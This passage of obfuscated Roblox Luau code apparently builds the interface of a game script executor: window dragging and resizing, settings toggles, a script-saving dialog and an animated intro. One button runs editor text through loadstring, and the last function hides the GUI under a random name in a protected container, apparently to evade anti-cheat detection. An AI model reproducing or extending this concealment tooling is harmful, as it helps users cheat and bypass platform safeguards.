			v1422 = v1420.Parent.Parent.Parent.Parent.Parent.Parent.SavePopup;
			v1421.MouseButton1Click:Connect(function()
				v1422.Visible = true;
			end);
			break;
		end
	end
end
task.spawn(v1180);
local function v1181()
	local v1423 = v0["4f"];
	local v1424 = v1423.Parent.Parent.Parent.SourceBg.Source;
	v1423.Parent.Hitbox.MouseButton1Click:Connect(function()
		v1424.Visible = not v1424.Visible;
	end);
end
task.spawn(v1181);
local function v1182()
	local v1425 = v0["52"];
	v1425.Parent.Hitbox.MouseButton1Click:Connect(function()
		loadstring(v0["2c"]['Text'])();
	end);
end
task.spawn(v1182);
local function v1183()
	local v1426 = 0 + 0;
	local v1427;
	local v1428;
	local v1429;
	local v1430;
	local v1431;
	local v1432;
	local v1433;
	while true do
		if (v1426 == (4 + 0)) then
			for v2850, v2851 in ipairs(v1427.Parent:GetChildren()) do
				if v2851:IsA("ImageButton") then
					v1433(v2851);
				end
			end
			break;
		end
		if (v1426 == (2 - 0)) then
			v1431 = v1429.modernColors.ElectricBlue;
			v1432 = Color3.fromRGB(270 - (90 + 10), 974 - (209 + 595), 975 - (603 + 202));
			v1426 = 3;
		end
		if (v1426 == (2 + 1)) then
			v1433 = nil;
			function v1433(v2852)
				local v2853 = 0 - 0;
				local v2854;
				while true do
					if (v2853 == (1 + 0)) then
						v2854.MouseLeave:Connect(function()
							v1428:Create(v2852.ImageButton, v1429.tweenInfo.hover, {ImageColor3=v1432}):Play();
							v1428:Create(v2852.TextLabel, v1429.tweenInfo.hover, {TextColor3=v1432}):Play();
						end);
						break;
					end
					if (v2853 == 0) then
						v2854 = v2852.Hitbox;
						v2854.MouseEnter:Connect(function()
							local v3438 = 0;
							while true do
								if (0 == v3438) then
									v1428:Create(v2852.ImageButton, v1429.tweenInfo.hover, {ImageColor3=v1431}):Play();
									v1428:Create(v2852.TextLabel, v1429.tweenInfo.hover, {TextColor3=v1431}):Play();
									break;
								end
							end
						end);
						v2853 = 1;
					end
				end
			end
			v1426 = 4;
		end
		if (v1426 == (0 - 0)) then
			v1427 = v0["55"];
			v1428 = game:GetService("TweenService");
			v1426 = 1 + 0;
		end
		if (v1426 == (2 - 1)) then
			v1429 = v1160(v1427.Parent.Parent.Parent.Parent.Parent.Parent.utils);
			v1430 = v1427.Parent;
			v1426 = 2;
		end
	end
end
task.spawn(v1183);
local function v1184()
	local v1434 = v0["7f"];
	local v1435 = v1434.Parent.Parent.Parent.Parent;
	local v1436 = v1160(v1435.config);
	local v1437 = v1160(v1435.magnolia);
	local v1438 = v1434.Parent.InnerBody.ScrollingFrame;
	local v1439 = v1438.dummy;
	v1439.Parent = nil;
	local v1441 = {codeColors="Code Editor",canDebug="Can Debug"};
	local v1442;
	local v1443 = v1437.new("ColorPicker", v1435.Main);
	v1443.AnchorPoint = Vector2.new(0.5 - 0, 279.5 - (174 + 105));
	v1443.Position = UDim2.fromScale(0.5 - 0, 0.5);
	v1443.ZIndex = 1013 - (532 + 381);
	v1443.Visible = false;
	v1443:Open();
	v1435.Main.UICorner:Clone().Parent = v1437.GetInstance(v1443);
	local v1449 = 0 + 0;
	local function v1450(v1648, v1649, v1650)
		local v1651;
		local v1652 = v1441[v1648] or v1648;
		local v1653 = v1650 or v1436.data.settings;
		if (typeof(v1649) == "Color3") then
			v1651 = v1439:Clone();
			local v2675 = Instance.new("ImageButton", v1651);
			v2675.Size = UDim2.fromOffset(859 - (137 + 702), 20);
			v2675.AnchorPoint = Vector2.new(2 - 1, 0.5);
			v2675.Position = UDim2.fromScale(1 + 0, 0.5 - 0);
			v2675.BackgroundColor3 = v1649;
			local v2680 = Instance.new("UICorner", v2675);
			v2680.CornerRadius = UDim.new(1887 - (1819 + 67), 0 + 0);
			v2675.MouseButton1Click:Connect(function()
				v1443.Visible = not v1443.Visible;
				if v1443.Visible then
					local v3244 = 0 + 0;
					while true do
						if (v3244 == (1357 - (259 + 1098))) then
							v1443:SelectColor(v2675.BackgroundColor3);
							v1442 = v1443.ColorChanged:Connect(function()
								v1653[v1648] = v1443.Color;
								v2675.BackgroundColor3 = v1443.Color;
								v1436.save();
							end);
							break;
						end
					end
				else
					v1442:Disconnect();
				end
			end);
		elseif (type(v1649) == "boolean") then
			v1651 = v1439:Clone();
			local v3081 = v1437.new("Switch", v1651);
			v3081.AnchorPoint = Vector2.new(1 + 0, 0.5);
			v3081.Position = UDim2.fromScale(1 + 0, 0.5 + 0);
			v3081:Toggle(v1649);
			v3081.ValueChanged:Connect(function()
				v1653[v1648] = v3081.Value;
				v1436.save();
			end);
		elseif (v1649 == nil) then
			local v3359 = 0;
			while true do
				if (v3359 == (0 - 0)) then
					v1651 = v1439:Clone();
					v1651.Title.Font = Enum.Font.SourceSansBold;
					break;
				end
			end
		end
		if v1651 then
			v1449 += (1 + 0)
			v1651.Name = tostring(v1449);
			v1651.Title.Text = v1652;
			v1651.Parent = v1438;
			if v1650 then
				v1651.Title.Position = UDim2.new(0 + 0, 20, 0.5 - 0, 0);
			end
		end
	end
	local function v1451(v1654, v1655)
		for v2463, v2464 in next, v1654 do
			if (type(v2464) == "table") then
				local v2856 = 1706 - (667 + 1039);
				while true do
					if (v2856 == 0) then
						v1450(v2463);
						v1451(v2464, v2464);
						break;
					end
				end
			else
				v1450(v2463, v2464, v1655);
			end
		end
		v1438.CanvasSize = UDim2.fromOffset(0, (v1449 * v1439.AbsoluteSize.Y) + (v1449 * v1438.UIListLayout.Padding.Offset));
	end
	v1434.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
		if (v1434.Parent.Visible == false) then
			v1443.Visible = false;
			if v1442 then
				v1442:Disconnect();
			end
		end
	end);
	v1451(v1436.data.settings);
end
task.spawn(v1184);
local function v1185()
	local v1452 = v0["80"];
	local v1453 = game:GetService("RunService");
	local v1454 = game:GetService("TweenService");
	local v1455 = game:GetService("Players");
	local v1456 = game:GetService("UserInputService");
	local v1457 = v1455.LocalPlayer;
	local v1458 = v1457:GetMouse();
	local v1459 = v1160(v1452.Parent.Parent.utils);
	local v1460 = v1452.Parent;
	local v1461 = v1452.Parent.Topbar.Hitbox;
	local v1462 = v1459.tweenInfo.move;
	local v1463;
	local v1464;
	local v1465 = v1456.TouchEnabled;
	local function v1466()
		local v1657 = 0;
		local v1658;
		while true do
			if (v1657 == (1020 - (274 + 745))) then
				v1454:Create(v1460, v1462, {Position=v1658}):Play();
				break;
			end
			if (v1657 == 0) then
				v1658 = nil;
				if v1465 then
					v1658 = UDim2.fromOffset(v1458.X, v1458.Y);
				else
					local v3247 = 0;
					local v3248;
					local v3249;
					while true do
						if (0 == v3247) then
							v3248 = Vector2.new(v1458.X, v1458.Y) - v1460.AbsolutePosition;
							v3249 = v1460.AbsolutePosition + (v3248 - v1464);
							v3247 = 1 + 0;
						end
						if (v3247 == (1 + 0)) then
							v1658 = UDim2.fromOffset(v3249.X, v3249.Y);
							break;
						end
					end
				end
				v1657 = 431 - (288 + 142);
			end
		end
	end
	local function v1467()
		if v1463 then
			local v2686 = 0;
			while true do
				if (0 == v2686) then
					v1463:Disconnect();
					v1463 = nil;
					break;
				end
			end
		end
	end
	v1459.onDownUp(v1461, function()
		v1467();
		v1464 = Vector2.new(v1458.X, v1458.Y) - v1460.AbsolutePosition;
		v1463 = v1453.RenderStepped:Connect(v1466);
	end, function()
		v1467();
	end);
end
task.spawn(v1185);
local function v1186()
	local v1468 = 0;
	local v1469;
	local v1470;
	local v1471;
	local v1472;
	local v1473;
	local v1474;
	local v1475;
	local v1476;
	local v1477;
	local v1478;
	local v1479;
	local v1480;
	while true do
		if (v1468 == (1306 - (301 + 1005))) then
			v1469 = v0["83"];
			v1470 = v1160(v1469.Parent.Parent.Parent.utils);
			v1471 = game:GetService("RunService");
			v1468 = 1;
		end
		if (v1468 == (2 + 1)) then
			v1478 = v1469.Parent;
			v1478.MouseEnter:Connect(function()
				local v2857 = 0 - 0;
				while true do
					if (v2857 == (1874 - (674 + 1199))) then
						v1474.Icon = "rbxassetid://10406654632";
						break;
					end
					if (v2857 == 0) then
						if v1475 then
							return;
						end
						v1476 = v1474.Icon;
						v2857 = 1 + 0;
					end
				end
			end);
			v1478.MouseLeave:Connect(function()
				v1474.Icon = v1476;
			end);
			v1468 = 3 + 1;
		end
		if (v1468 == (14 - 9)) then
			function v1480()
				local v2859 = 0 - 0;
				local v2860;
				local v2861;
				local v2862;
				while true do
					if (v2859 == 1) then
						v2861 = v2860 - v1477.AbsolutePosition;
						v2862 = UDim2.new(0 + 0, math.clamp(v2861.X, v1472.X, v1473.X), 0, math.clamp(v2861.Y, v1472.Y, v1473.Y));
						v2859 = 2;
					end
					if (v2859 == (445 - (92 + 353))) then
						v1474.Icon = "rbxassetid://10406654632";
						v2860 = Vector2.new(v1474.X, v1474.Y);
						v2859 = 1 + 0;
					end
					if (v2859 == 2) then
						v1477.Size = v2862;
						break;
					end
				end
			end
			v1470.onDownUp(v1478, function()
				local v2863 = 0 - 0;
				while true do
					if (v2863 == 0) then
						v1479();
						v1475 = v1471.RenderStepped:Connect(v1480);
						break;
					end
				end
			end, function()
				v1479();
			end);
			break;
		end
		if (v1468 == (3 - 1)) then
			v1475 = nil;
			v1476 = v1474.Icon;
			v1477 = v1469.Parent.Parent;
			v1468 = 8 - 5;
		end
		if (v1468 == 1) then
			v1472 = Vector2.new(275 + 228, 442 - 194);
			v1473 = Vector2.new(1618 - 898, 1875 - 1443);
			v1474 = game:GetService("Players").LocalPlayer:GetMouse();
			v1468 = 2 + 0;
		end
		if (v1468 == (7 - 3)) then
			v1479 = nil;
			function v1479()
				local v2864 = 265 - (34 + 231);
				while true do
					if (v2864 == (1317 - (930 + 387))) then
						if not v1475 then
							return;
						end
						v1475:Disconnect();
						v2864 = 1 + 0;
					end
					if (v2864 == (1 + 0)) then
						v1475 = nil;
						v1474.Icon = v1476;
						break;
					end
				end
			end
			v1480 = nil;
			v1468 = 13 - 8;
		end
	end
end
task.spawn(v1186);
local function v1187()
	local v1481 = 0;
	local v1482;
	local v1483;
	local v1484;
	local v1485;
	local v1486;
	local v1487;
	local v1488;
	local v1489;
	local v1490;
	local v1491;
	while true do
		if (v1481 == (703 - (389 + 308))) then
			v1491.IconSize = 51 - 31;
			v1491.Image = "rbxassetid://4732495519";
			v1491.Clicked:Connect(function()
				local v2865 = 0 - 0;
				local v2866;
				local v2867;
				while true do
					if (v2865 == (8 - 5)) then
						v1482.Parent.Visible = false;
						break;
					end
					if (v2865 == 0) then
						v2866 = v1488.getCode();
						v2867 = v1489.Text;
						v2865 = 1;
					end
					if (v2865 == 1) then
						if (#v2867 == (0 + 0)) then
							return;
						end
						v1487.addScript(v2867, v2866, true);
						v2865 = 2;
					end
					if (v2865 == (324 - (125 + 197))) then
						v1485.data.scripts[v2867] = v2866;
						v1485.save();
						v2865 = 1000 - (339 + 658);
					end
				end
			end);
			v1481 = 17 - 10;
		end
		if (v1481 == 0) then
			v1482 = v0["86"];
			v1483 = v1482.Parent.Parent.Parent;
			v1484 = v1482.Parent.ImageLabel.Hitbox;
			v1481 = 1 - 0;
		end
		if (v1481 == 5) then
			v1491.Position = UDim2.fromScale(0.5, 1348.8 - (743 + 605));
			v1491.AnchorPoint = Vector2.new(0.5, 0.5 + 0);
			v1491.Size = UDim2.fromOffset(5 + 35, 40);
			v1481 = 6;
		end
		if ((14 - 10) == v1481) then
			v1489.AnchorPoint = Vector2.new(0.5, 0.5 - 0);
			v1489.Size = UDim2.new(1, -20, 0 + 0, 24);
			v1491 = v1486.new("ButtonIcon", v1482.Parent);
			v1481 = 5;
		end
		if (v1481 == (252 - (197 + 52))) then
			v1490 = v1486.GetMeta(v1489).__TextBox;
			v1489.PlaceholderText = "Script Name";
			v1489.Position = UDim2.fromScale(0.5 - 0, 0.5 - 0);
			v1481 = 3 + 1;
		end
		if (v1481 == (2 + 0)) then
			v1488 = v1160(v1483.editor);
			v1484.MouseButton1Click:Connect(function()
				v1482.Parent.Visible = false;
			end);
			v1489 = v1486.new("TextBox", v1482.Parent);
			v1481 = 4 - 1;
		end
		if (1 == v1481) then
			v1485 = v1160(v1483.config);
			v1486 = v1160(v1483.magnolia);
			v1487 = v1160(v1483.scripthub);
			v1481 = 2;
		end
		if (v1481 == 7) then
			v1482.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
				if v1482.Parent.Visible then
					v1490:CaptureFocus();
				end
			end);
			break;
		end
	end
end
task.spawn(v1187);
local function v1188()
	local v1492 = 0 - 0;
	local v1493;
	local v1494;
	local v1495;
	local v1496;
	local v1497;
	local v1498;
	local v1499;
	local v1500;
	local v1501;
	local v1502;
	local v1503;
	local v1504;
	local v1505;
	local v1506;
	while true do
		if (v1492 == (11 - 6)) then
			v1494:Create(v1504, v1495.tweenInfo.slowBackMove, {Rotation=((140 + 220) * (2 - 0))}):Play();
			v1505:Play();
			v1505.Completed:Wait();
			v1506 = v1494:Create(v1496, v1495.tweenInfo.expand, {Size=v1502});
			v1506:Play();
			v1494:Create(v1501, v1495.tweenInfo.expand, {CornerRadius=v1503}):Play();
			v1492 = 1103 - (97 + 1000);
		end
		if (v1492 == (14 - 10)) then
			v1496.Position = UDim2.new(0.5, 1845 - (143 + 1702), 1 - 0, v1496.AbsoluteSize.Y);
			v1501:Clone().Parent = v1504;
			for v2869, v2870 in next, v1497:GetChildren() do
				v2870.Visible = false;
			end
			v1497.Executor.Visible = true;
			if game:GetService("RunService"):IsStudio() then
				task.wait(370 - (40 + 329));
			end
			v1505 = v1494:Create(v1496, v1495.tweenInfo.slowBackMove, {Position=UDim2.new(0.5 + 0, 0 + 0, 0.5, 0)});
			v1492 = 7 - 2;
		end
		if (v1492 == (1 + 1)) then
			v1504.BackgroundTransparency = 66 - (9 + 56);
			v1504.Image = "rbxassetid://140220253874434";
			v1504.Size = UDim2.new(584 - (531 + 53), 75 + 5, 0, 853 - (89 + 684));
			v1504.AnchorPoint = Vector2.new(0.5 + 0, 0.5 + 0);
			v1504.Position = UDim2.new(0.5, 0 + 0, 0.5 - 0, 0 + 0);
			v1497.Visible = false;
			v1492 = 3 + 0;
		end
		if (v1492 == (620 - (238 + 375))) then
			v1498.Visible = true;
			v1499.Visible = true;
			v1500.Visible = true;
			break;
		end
		if (v1492 == (6 + 0)) then
			v1494:Create(v1504, v1495.tweenInfo.expand, {ImageTransparency=(1 - 0)}):Play();
			v1506.Completed:Wait();
			v1504:Destroy();
			v1496.AnchorPoint = Vector2.new(0 + 0, 0);
			v1496.Position = UDim2.new(0.5 - 0, -v1502.X.Offset / (5 - 3), 0.5, -v1502.Y.Offset / (5 - 3));
			v1497.Visible = true;
			v1492 = 14 - 7;
		end
		if (v1492 == (3 - 2)) then
			v1499 = v1496.Sidebar;
			v1500 = v1496.Topbar;
			v1501 = v1496.UICorner;
			v1502 = v1496.Size;
			v1503 = v1501.CornerRadius;
			v1504 = Instance.new("ImageLabel", v1496);
			v1492 = 2 - 0;
		end
		if (v1492 == (3 + 0)) then
			v1498.Visible = false;
			v1499.Visible = false;
			v1500.Visible = false;
			v1501.CornerRadius = UDim.new(1 + 0, 0 + 0);
			v1496.Size = UDim2.new(462 - (428 + 34), 100, 0 + 0, 156 - 56);
			v1496.AnchorPoint = Vector2.new(0.5 - 0, 0.5);
			v1492 = 9 - 5;
		end
		if (0 == v1492) then
			v1493 = v0["8e"];
			v1494 = game:GetService("TweenService");
			v1495 = v1160(v1493.Parent.utils);
			v1496 = v1493.Parent.Main;
			v1497 = v1496.BodyClipping;
			v1498 = v1496.Resize;
			v1492 = 919 - (223 + 695);
		end
	end
end
task.spawn(v1188);
local function v1189()
	local v1507 = 0 - 0;
	local v1508;
	local v1509;
	local v1510;
	while true do
		if (v1507 == (512 - (329 + 182))) then
			v1510 = v1508.Parent;
			v1509.ProtectGui(v1510);
			v1507 = 2;
		end
		if (0 == v1507) then
			v1508 = v0["95"];
			v1509 = v1160(v1508.Parent.magnolia);
			v1507 = 1;
		end
		if (v1507 == (1 + 1)) then
			v1510.Name = v1509.Utils.RandomString(math.random(8 - 3, 2 + 6));
			v1510.Parent = v1509.GetHiddenGui();
			break;
		end
	end
end
task.spawn(v1189);
return v0["1"], v1160;
